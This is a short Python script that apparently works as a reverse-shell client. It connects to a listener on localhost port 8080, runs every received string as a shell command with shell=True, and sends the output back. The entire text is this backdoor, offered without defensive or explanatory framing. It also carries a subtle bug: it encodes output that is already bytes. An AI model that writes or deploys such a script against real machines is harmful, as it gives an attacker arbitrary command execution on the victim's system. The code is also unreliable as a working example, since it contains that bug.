import socket
import subprocess

payload = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
payload.connect(('localhost', 8080))
print('establish connect')

while True:
    cmd = payload.recv(2048)
    if cmd == b'quit':
        payload.close()
        break
    cmd = cmd.decode('utf-8')
    output = subprocess.check_output(cmd, shell=True)
    payload.send(bytes(output, 'utf-8'))
